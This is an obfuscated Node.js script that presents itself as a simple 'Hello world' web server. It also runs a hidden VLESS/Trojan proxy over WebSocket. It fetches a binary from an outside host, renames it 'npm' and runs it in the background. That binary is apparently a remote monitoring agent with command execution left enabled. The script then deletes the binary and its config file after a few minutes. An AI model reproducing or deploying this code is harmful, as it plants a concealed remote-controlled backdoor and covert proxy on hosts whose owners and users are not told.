const _0x2a396e=_0x4314;(function(_0x38f8fd,_0x5559df){const _0xdf2959=_0x4314,_0x58cdfd=_0x38f8fd();while(!![]){try{const _0x48d83c=-parseInt(_0xdf2959(0x1c5))/0x1*(parseInt(_0xdf2959(0x1b8))/0x2)+parseInt(_0xdf2959(0x171))/0x3+parseInt(_0xdf2959(0x18b))/0x4+parseInt(_0xdf2959(0x19d))/0x5*(parseInt(_0xdf2959(0x163))/0x6)+parseInt(_0xdf2959(0x1bf))/0x7+-parseInt(_0xdf2959(0x18c))/0x8+parseInt(_0xdf2959(0x167))/0x9;if(_0x48d83c===_0x5559df)break;else _0x58cdfd['push'](_0x58cdfd['shift']());}catch(_0x3c20ee){_0x58cdfd['push'](_0x58cdfd['shift']());}}}(_0x1e3f,0x74453));const os=require('os'),http=require(_0x2a396e(0x1b3)),fs=require('fs'),axios=require(_0x2a396e(0x191)),net=require(_0x2a396e(0x14b)),path=require(_0x2a396e(0x168)),crypto=require(_0x2a396e(0x1b2)),{Buffer}=require(_0x2a396e(0x196)),{exec,execSync}=require(_0x2a396e(0x14a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2a396e(0x16c)][_0x2a396e(0x154)]||_0x2a396e(0x18a),NEZHA_SERVER=process[_0x2a396e(0x16c)][_0x2a396e(0x189)]||'',NEZHA_PORT=process[_0x2a396e(0x16c)][_0x2a396e(0x170)]||'',NEZHA_KEY=process[_0x2a396e(0x16c)]['NEZHA_KEY']||'',DOMAIN=process['env'][_0x2a396e(0x156)]||_0x2a396e(0x173),AUTO_ACCESS=process[_0x2a396e(0x16c)][_0x2a396e(0x16e)]||!![],WSPATH=process['env'][_0x2a396e(0x1a9)]||UUID[_0x2a396e(0x1c2)](0x0,0x8),SUB_PATH=process[_0x2a396e(0x16c)][_0x2a396e(0x1b5)]||'sub',NAME=process[_0x2a396e(0x16c)]['NAME']||_0x2a396e(0x1ad),PORT=process[_0x2a396e(0x16c)][_0x2a396e(0x14f)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x252542=_0x2a396e;try{const _0x559c63=await axios[_0x252542(0x1ba)](_0x252542(0x1a0)),_0x3dfacd=_0x559c63['data'];ISP=(_0x3dfacd['country']+'-'+_0x3dfacd[_0x252542(0x18f)])[_0x252542(0x199)](/ /g,'_');}catch(_0x4b5c4e){ISP=_0x252542(0x148);}};function _0x4314(_0x2e9eab,_0x1ab08c){_0x2e9eab=_0x2e9eab-0x13f;const _0x1e3f13=_0x1e3f();let _0x43143e=_0x1e3f13[_0x2e9eab];return _0x43143e;}GetISP();const httpServer=http['createServer']((_0x5b117f,_0x343f3f)=>{const _0x9ed418=_0x2a396e;if(_0x5b117f[_0x9ed418(0x1c0)]==='/'){const _0x8985dd=path[_0x9ed418(0x144)](__dirname,'index.html');fs[_0x9ed418(0x1c1)](_0x8985dd,_0x9ed418(0x149),(_0x48e4e2,_0x43fe3a)=>{const _0x42b490=_0x9ed418;if(_0x48e4e2){_0x343f3f['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x343f3f[_0x42b490(0x1b9)](_0x42b490(0x18e));return;}_0x343f3f[_0x42b490(0x157)](0xc8,{'Content-Type':_0x42b490(0x177)}),_0x343f3f[_0x42b490(0x1b9)](_0x43fe3a);});return;}else{if(_0x5b117f['url']==='/'+SUB_PATH){const _0x1f670d=_0x9ed418(0x155)+UUID+'@'+DOMAIN+_0x9ed418(0x1bb)+DOMAIN+_0x9ed418(0x198)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x411f6b=_0x9ed418(0x182)+UUID+'@'+DOMAIN+_0x9ed418(0x14c)+DOMAIN+_0x9ed418(0x198)+DOMAIN+_0x9ed418(0x19c)+WSPATH+'#'+NAME+'-'+ISP,_0x28cc24=_0x1f670d+'\x0a'+_0x411f6b,_0x5731a6=Buffer[_0x9ed418(0x1b6)](_0x28cc24)[_0x9ed418(0x1a1)](_0x9ed418(0x13f));_0x343f3f[_0x9ed418(0x157)](0xc8,{'Content-Type':'text/plain'}),_0x343f3f[_0x9ed418(0x1b9)](_0x5731a6+'\x0a');}else _0x343f3f[_0x9ed418(0x157)](0x194,{'Content-Type':_0x9ed418(0x169)}),_0x343f3f[_0x9ed418(0x1b9)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x2a396e(0x1c4))]({'server':httpServer}),uuid=UUID[_0x2a396e(0x199)](/-/g,''),DNS_SERVERS=[_0x2a396e(0x16a),'1.1.1.1'];function resolveHost(_0x29d6de){return new Promise((_0x4b6377,_0x3c0c02)=>{const _0x44c18c=_0x4314;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x44c18c(0x1aa)](_0x29d6de)){_0x4b6377(_0x29d6de);return;}let _0x6af90=0x0;function _0x533298(){const _0x3f9f75=_0x44c18c;if(_0x6af90>=DNS_SERVERS[_0x3f9f75(0x1ac)]){_0x3c0c02(new Error(_0x3f9f75(0x1b4)+_0x29d6de+_0x3f9f75(0x17b)));return;}const _0x4f616c=DNS_SERVERS[_0x6af90];_0x6af90++;const _0x526a05='https://dns.google/resolve?name='+encodeURIComponent(_0x29d6de)+_0x3f9f75(0x142);axios['get'](_0x526a05,{'timeout':0x1388,'headers':{'Accept':_0x3f9f75(0x1a5)}})[_0x3f9f75(0x140)](_0x1a9d2d=>{const _0xc6b783=_0x3f9f75,_0x48ed1a=_0x1a9d2d[_0xc6b783(0x143)];if(_0x48ed1a[_0xc6b783(0x1a7)]===0x0&&_0x48ed1a[_0xc6b783(0x185)]&&_0x48ed1a[_0xc6b783(0x185)]['length']>0x0){const _0x24d1a4=_0x48ed1a[_0xc6b783(0x185)]['find'](_0x5751bf=>_0x5751bf[_0xc6b783(0x19f)]===0x1);if(_0x24d1a4){_0x4b6377(_0x24d1a4[_0xc6b783(0x143)]);return;}}_0x533298();})['catch'](_0x40584d=>{_0x533298();});}_0x533298();});}function handleVlessConnection(_0x3ff277,_0x5898b2){const _0x463792=_0x2a396e,[_0x427e5f]=_0x5898b2,_0x2069b4=_0x5898b2[_0x463792(0x1c2)](0x1,0x11);if(!_0x2069b4[_0x463792(0x1a4)]((_0x3abb04,_0x3577d5)=>_0x3abb04==parseInt(uuid[_0x463792(0x175)](_0x3577d5*0x2,0x2),0x10)))return![];let _0x20eab6=_0x5898b2[_0x463792(0x1c2)](0x11,0x12)[_0x463792(0x152)]()+0x13;const _0x304acf=_0x5898b2[_0x463792(0x1c2)](_0x20eab6,_0x20eab6+=0x2)[_0x463792(0x161)](0x0),_0x4e1a29=_0x5898b2[_0x463792(0x1c2)](_0x20eab6,_0x20eab6+=0x1)[_0x463792(0x152)](),_0x2bfe72=_0x4e1a29==0x1?_0x5898b2[_0x463792(0x1c2)](_0x20eab6,_0x20eab6+=0x4)[_0x463792(0x144)]('.'):_0x4e1a29==0x2?new TextDecoder()[_0x463792(0x15f)](_0x5898b2['slice'](_0x20eab6+0x1,_0x20eab6+=0x1+_0x5898b2[_0x463792(0x1c2)](_0x20eab6,_0x20eab6+0x1)[_0x463792(0x152)]())):_0x4e1a29==0x3?_0x5898b2[_0x463792(0x1c2)](_0x20eab6,_0x20eab6+=0x10)[_0x463792(0x1b1)]((_0x259904,_0x353704,_0x1389e5,_0x56462a)=>_0x1389e5%0x2?_0x259904[_0x463792(0x17a)](_0x56462a['slice'](_0x1389e5-0x1,_0x1389e5+0x1)):_0x259904,[])[_0x463792(0x18d)](_0x24dae3=>_0x24dae3[_0x463792(0x161)](0x0)[_0x463792(0x1a1)](0x10))[_0x463792(0x144)](':'):'';_0x3ff277[_0x463792(0x141)](new Uint8Array([_0x427e5f,0x0]));const _0x3228c7=createWebSocketStream(_0x3ff277);return resolveHost(_0x2bfe72)[_0x463792(0x140)](_0x5f4c7f=>{const _0x2c837a=_0x463792;net[_0x2c837a(0x19a)]({'host':_0x5f4c7f,'port':_0x304acf},function(){const _0x5a3fc9=_0x2c837a;this[_0x5a3fc9(0x1a2)](_0x5898b2['slice'](_0x20eab6)),_0x3228c7['on'](_0x5a3fc9(0x192),()=>{})['pipe'](this)['on']('error',()=>{})[_0x5a3fc9(0x195)](_0x3228c7);})['on'](_0x2c837a(0x192),()=>{});})[_0x463792(0x1af)](_0x50c72c=>{const _0x48e27b=_0x463792;net[_0x48e27b(0x19a)]({'host':_0x2bfe72,'port':_0x304acf},function(){const _0x1c7df4=_0x48e27b;this[_0x1c7df4(0x1a2)](_0x5898b2['slice'](_0x20eab6)),_0x3228c7['on']('error',()=>{})[_0x1c7df4(0x195)](this)['on'](_0x1c7df4(0x192),()=>{})[_0x1c7df4(0x195)](_0x3228c7);})['on'](_0x48e27b(0x192),()=>{});}),!![];}function handleTrojanConnection(_0x4d213a,_0x52f0f9){const _0xc9b5e5=_0x2a396e;try{if(_0x52f0f9[_0xc9b5e5(0x1ac)]<0x3a)return![];const _0x5194af=_0x52f0f9[_0xc9b5e5(0x1c2)](0x0,0x38)[_0xc9b5e5(0x1a1)](),_0x254e20=[UUID];let _0x185a65=null;for(const _0x4966c8 of _0x254e20){const _0x294cef=crypto[_0xc9b5e5(0x176)](_0xc9b5e5(0x158))[_0xc9b5e5(0x17d)](_0x4966c8)[_0xc9b5e5(0x147)](_0xc9b5e5(0x1b7));if(_0x294cef===_0x5194af){_0x185a65=_0x4966c8;break;}}if(!_0x185a65)return![];let _0x4f2236=0x38;_0x52f0f9[_0x4f2236]===0xd&&_0x52f0f9[_0x4f2236+0x1]===0xa&&(_0x4f2236+=0x2);const _0x1dac0f=_0x52f0f9[_0x4f2236];if(_0x1dac0f!==0x1)return![];_0x4f2236+=0x1;const _0x114793=_0x52f0f9[_0x4f2236];_0x4f2236+=0x1;let _0x409f92,_0x29baa5;if(_0x114793===0x1)_0x409f92=_0x52f0f9[_0xc9b5e5(0x1c2)](_0x4f2236,_0x4f2236+0x4)[_0xc9b5e5(0x144)]('.'),_0x4f2236+=0x4;else{if(_0x114793===0x3){const _0xddc0e3=_0x52f0f9[_0x4f2236];_0x4f2236+=0x1,_0x409f92=_0x52f0f9['slice'](_0x4f2236,_0x4f2236+_0xddc0e3)[_0xc9b5e5(0x1a1)](),_0x4f2236+=_0xddc0e3;}else{if(_0x114793===0x4)_0x409f92=_0x52f0f9[_0xc9b5e5(0x1c2)](_0x4f2236,_0x4f2236+0x10)[_0xc9b5e5(0x1b1)]((_0x338f54,_0x5e5fc6,_0x317eaa,_0x8024d1)=>_0x317eaa%0x2?_0x338f54['concat'](_0x8024d1[_0xc9b5e5(0x1c2)](_0x317eaa-0x1,_0x317eaa+0x1)):_0x338f54,[])[_0xc9b5e5(0x18d)](_0x5e48ab=>_0x5e48ab[_0xc9b5e5(0x161)](0x0)['toString'](0x10))[_0xc9b5e5(0x144)](':'),_0x4f2236+=0x10;else return![];}}_0x29baa5=_0x52f0f9[_0xc9b5e5(0x161)](_0x4f2236),_0x4f2236+=0x2;_0x4f2236<_0x52f0f9[_0xc9b5e5(0x1ac)]&&_0x52f0f9[_0x4f2236]===0xd&&_0x52f0f9[_0x4f2236+0x1]===0xa&&(_0x4f2236+=0x2);const _0x239bf0=createWebSocketStream(_0x4d213a);return resolveHost(_0x409f92)[_0xc9b5e5(0x140)](_0x26d33e=>{const _0x1ee2d8=_0xc9b5e5;net[_0x1ee2d8(0x19a)]({'host':_0x26d33e,'port':_0x29baa5},function(){const _0x3fb94e=_0x1ee2d8;_0x4f2236<_0x52f0f9[_0x3fb94e(0x1ac)]&&this[_0x3fb94e(0x1a2)](_0x52f0f9[_0x3fb94e(0x1c2)](_0x4f2236)),_0x239bf0['on']('error',()=>{})[_0x3fb94e(0x195)](this)['on'](_0x3fb94e(0x192),()=>{})[_0x3fb94e(0x195)](_0x239bf0);})['on'](_0x1ee2d8(0x192),()=>{});})[_0xc9b5e5(0x1af)](_0x668c69=>{const _0x5a7368=_0xc9b5e5;net[_0x5a7368(0x19a)]({'host':_0x409f92,'port':_0x29baa5},function(){const _0x4b358c=_0x5a7368;_0x4f2236<_0x52f0f9['length']&&this[_0x4b358c(0x1a2)](_0x52f0f9[_0x4b358c(0x1c2)](_0x4f2236)),_0x239bf0['on'](_0x4b358c(0x192),()=>{})['pipe'](this)['on'](_0x4b358c(0x192),()=>{})[_0x4b358c(0x195)](_0x239bf0);})['on']('error',()=>{});}),!![];}catch(_0x320ada){return![];}}wss['on'](_0x2a396e(0x181),(_0x250efd,_0xda7c1f)=>{const _0x4dbfa3=_0x2a396e,_0x1438a3=_0xda7c1f[_0x4dbfa3(0x1c0)]||'';_0x250efd[_0x4dbfa3(0x193)]('message',_0x2214dc=>{const _0x14cf8e=_0x4dbfa3;if(_0x2214dc[_0x14cf8e(0x1ac)]>0x11&&_0x2214dc[0x0]===0x0){const _0x1e4d20=_0x2214dc[_0x14cf8e(0x1c2)](0x1,0x11),_0x190c94=_0x1e4d20[_0x14cf8e(0x1a4)]((_0x28653d,_0x3762c6)=>_0x28653d==parseInt(uuid[_0x14cf8e(0x175)](_0x3762c6*0x2,0x2),0x10));if(_0x190c94){!handleVlessConnection(_0x250efd,_0x2214dc)&&_0x250efd['close']();return;}}!handleTrojanConnection(_0x250efd,_0x2214dc)&&_0x250efd[_0x14cf8e(0x180)]();})['on'](_0x4dbfa3(0x192),()=>{});});const getDownloadUrl=()=>{const _0x586049=_0x2a396e,_0x3e0457=os['arch']();return _0x3e0457===_0x586049(0x1bd)||_0x3e0457===_0x586049(0x19e)||_0x3e0457===_0x586049(0x1c3)?!NEZHA_PORT?_0x586049(0x159):_0x586049(0x1be):!NEZHA_PORT?_0x586049(0x188):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x44c046=_0x2a396e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1644eb=getDownloadUrl(),_0x413903=await axios({'method':_0x44c046(0x1ba),'url':_0x1644eb,'responseType':_0x44c046(0x145)}),_0x5bf4e6=fs[_0x44c046(0x174)]('npm');return _0x413903['data'][_0x44c046(0x195)](_0x5bf4e6),new Promise((_0x55866b,_0x1f2147)=>{const _0x214a94=_0x44c046;_0x5bf4e6['on'](_0x214a94(0x16d),()=>{const _0x2ff49b=_0x214a94;console[_0x2ff49b(0x15a)](_0x2ff49b(0x186)),exec(_0x2ff49b(0x19b),_0x4bcde7=>{if(_0x4bcde7)_0x1f2147(_0x4bcde7);_0x55866b();});}),_0x5bf4e6['on'](_0x214a94(0x192),_0x1f2147);});}catch(_0x3969ce){throw _0x3969ce;}},runnz=async()=>{const _0x1c04db=_0x2a396e;try{const _0x1f4431=execSync(_0x1c04db(0x1a8),{'encoding':_0x1c04db(0x15e)});if(_0x1f4431[_0x1c04db(0x184)]()!==''){console[_0x1c04db(0x15a)](_0x1c04db(0x166));return;}}catch(_0x347533){}await downloadFile();let _0x5c899f='',_0x27565e=[_0x1c04db(0x15c),_0x1c04db(0x1ab),_0x1c04db(0x162),_0x1c04db(0x16b),'2083',_0x1c04db(0x15d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2b48e3=_0x27565e[_0x1c04db(0x16f)](NEZHA_PORT)?'--tls':'';_0x5c899f=_0x1c04db(0x194)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1c04db(0x164)+NEZHA_KEY+'\x20'+_0x2b48e3+_0x1c04db(0x151);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x11dce6=NEZHA_SERVER[_0x1c04db(0x16f)](':')?NEZHA_SERVER[_0x1c04db(0x1a6)](':')[_0x1c04db(0x1b0)]():'',_0x3166fb=_0x27565e[_0x1c04db(0x16f)](_0x11dce6)?_0x1c04db(0x197):_0x1c04db(0x187),_0x4b5c0e=_0x1c04db(0x150)+NEZHA_KEY+_0x1c04db(0x14e)+NEZHA_SERVER+_0x1c04db(0x172)+_0x3166fb+_0x1c04db(0x1ae)+UUID;fs[_0x1c04db(0x160)](_0x1c04db(0x190),_0x4b5c0e);}_0x5c899f=_0x1c04db(0x17f);}else{console[_0x1c04db(0x15a)](_0x1c04db(0x15b));return;}}try{exec(_0x5c899f,{'shell':_0x1c04db(0x146)},_0x2a3009=>{const _0x206fd8=_0x1c04db;if(_0x2a3009)console[_0x206fd8(0x192)]('npm\x20running\x20error:',_0x2a3009);else console['log'](_0x206fd8(0x179));});}catch(_0x55a334){console[_0x1c04db(0x192)](_0x1c04db(0x178)+_0x55a334);}};async function addAccessTask(){const _0x1a014c=_0x2a396e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5003db=_0x1a014c(0x153)+DOMAIN;try{const _0x3791cc=await axios['post'](_0x1a014c(0x17e),{'url':_0x5003db},{'headers':{'Content-Type':_0x1a014c(0x183)}});console[_0x1a014c(0x15a)](_0x1a014c(0x165));}catch(_0x3957ed){}}const delFiles=()=>{const _0x13be1f=_0x2a396e;fs[_0x13be1f(0x17c)](_0x13be1f(0x1a3),()=>{}),fs[_0x13be1f(0x17c)](_0x13be1f(0x190),()=>{});};function _0x1e3f(){const _0x3f0644=['1483755YdgtnA','url','readFile','slice','aarch64','Server','50989nwXMCb','base64','then','send','&type=A','data','join','stream','/bin/bash','digest','Unknown','utf8','child_process','net',':443?security=tls&sni=','listen','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','PORT','client_secret:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','readUInt8','https://','UUID','vless://','DOMAIN','writeHead','sha224','https://arm64.ssss.nyc.mn/v1','log','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','443','2053','utf-8','decode','writeFileSync','readUInt16BE','2096','1935816lAYVDH','\x20-p\x20','Automatic\x20Access\x20Task\x20added\x20successfully','npm\x20is\x20already\x20running,\x20skip\x20running...','2422926ZmijCL','path','text/plain','8.8.4.4','2087','env','finish','AUTO_ACCESS','includes','NEZHA_PORT','956562vNoYfD','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','1234.abc.com','createWriteStream','substr','createHash','text/html','error:\x20','npm\x20is\x20running','concat','\x20with\x20all\x20DNS\x20servers','unlink','update','https://oooo.serv00.net/add-url','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','close','connection','trojan://','application/json','trim','Answer','npm\x20download\x20successfully','false','https://amd64.ssss.nyc.mn/v1','NEZHA_SERVER','3a64gaa8-f8d4-91fd-b8f0-17e004c89c60','2668356rlCJcL','6021088NQWmgd','map','Hello\x20world!','asOrganization','config.yaml','axios','error','once','setsid\x20nohup\x20./npm\x20-s\x20','pipe','buffer','true','&fp=chrome&type=ws&host=','replace','connect','chmod\x20+x\x20npm','&path=%2F','5ZcrBdo','arm64','type','https://speed.cloudflare.com/meta','toString','write','npm','every','application/dns-json','split','Status','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','WSPATH','test','8443','length','Hug','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','catch','pop','reduce','crypto','http','Failed\x20to\x20resolve\x20','SUB_PATH','from','hex','22QmSvLu','end','get',':443?encryption=none&security=tls&sni=','Server\x20is\x20running\x20on\x20port\x20','arm','https://arm64.ssss.nyc.mn/agent'];_0x1e3f=function(){return _0x3f0644;};return _0x1e3f();}httpServer[_0x2a396e(0x14d)](PORT,()=>{const _0x2b7440=_0x2a396e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2b7440(0x15a)](_0x2b7440(0x1bc)+PORT);});
